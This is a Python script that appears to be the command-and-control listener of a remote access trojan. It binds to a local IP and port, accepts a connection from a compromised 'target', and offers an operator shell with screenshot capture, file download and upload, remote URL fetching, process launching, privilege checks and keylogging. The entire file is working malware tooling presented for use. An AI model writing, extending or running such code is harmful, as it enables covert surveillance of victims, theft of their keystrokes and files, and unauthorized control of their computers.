#!/usr/bin/python
import socket 
import json
import base64

print(''' 
     .                 _          .                          .       
    /|    .___    ___  /         /|    , __     ___.   ___   |       
   /  \   /   \ .'   ` |,---.   /  \   |'  `. .'   ` .'   `  |       
  /---'\  |   ' |      |'   `  /---'\  |    | |    | |----'  |       
,'      \ /      `._.' /    |,'      \ /    |  `---| `.___, /\__     
                                               \___/                 
###############################################################
# Usage(Post-connect):                                        #
#                                                             #
#         screenshot     -> Take screenshot of target screen  #
#         download[path] -> Download a file from target pc    #
#         upload[path]   -> Upload a file to target pc        #
#         get[url]       -> Downloads external file from url  #
#         start[name]    -> starts process on target pc       #
#         check          -> checks for admin privileges       #
#         q              -> exits session                     #
#         help           -> shows options                     #
#         keylogger      -> starts keylogger                  #
#         dump_keys      -> displays recorded keystrokes      # 
###############################################################
''')

count = 1

def reliable_send(data):
	json_data = json.dumps(data)
	print(json_data)
	target.send(json_data)
	
def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024)
			return json.loads(json_data)
		except ValueError:
                        continue

def shell():
	while True:
		command = raw_input("Shell\#%s " % str(ip))
		reliable_send(command)
		if command == 'q':
			break
		elif command[:2] == 'cd' and len(command) > 1:
			continue
		elif command[:9] == 'keylogger':
			continue
		elif command[:8] == 'download':
			with open(command[9:], 'wb') as file:
				result = reliable_recv()
				file.write(base64.b64decode(result))
		elif command[:6] == 'upload':
			try:
				with open(command[7:], 'rb') as up:
					reliable_send(base64.b64encode(up.read()))
			except:
				failed = "===failed to upload==="
				reliable_send(base64.b64encode(failed))
		elif command[:10] == 'screenshot':
			global count
			with open('screenshot%d' % count, "wb") as screen:
				image = reliable_recv()
				decode_image = base64.b64decode(image)
				if decode_image[:4] == '[!!]':
					print(decode_image)
				else:
					screen.write(decode_image)
					count = count + 1
		else:
			result = reliable_recv()
			print(result)
               
def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("192.168.0.14", 12345))
	s.listen(5)
	print("====Listening for connections====")
	target, ip = s.accept()
	print("==connection received==")

server()
shell()
s.close()       
